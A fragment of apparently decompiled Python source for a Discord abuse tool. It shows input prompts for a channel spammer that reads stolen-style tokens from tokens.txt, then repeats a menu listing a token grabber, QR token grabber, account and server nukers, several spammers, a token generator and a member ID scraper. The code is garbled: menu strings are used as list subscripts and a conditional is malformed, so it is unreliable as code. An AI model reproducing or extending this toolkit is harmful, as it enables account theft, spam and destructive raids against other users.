        channel = input('[\x1b[95m>\x1b[95m\x1b[37m] Channel ID: ')
        mess = input('[\x1b[95m>\x1b[95m\x1b[37m] Message: ')
        delay = float(input('[\x1b[95m>\x1b[95m\x1b[37m] Delay: '))
        ch = input('[\x1b[95m>\x1b[95m\x1b[37m] Random Strings: Y/N?: ').lower()
        mas = input('[\x1b[95m>\x1b[95m\x1b[37m] Skip Locked Tokens?: Y/N?: ').lower()
        if mas == 'y':
            with open('tokens.txt') as f:
                firstline = f.readline().rstrip()
                []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''](None, None, None)
            if not []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16']:
                pass
            []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']
            []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   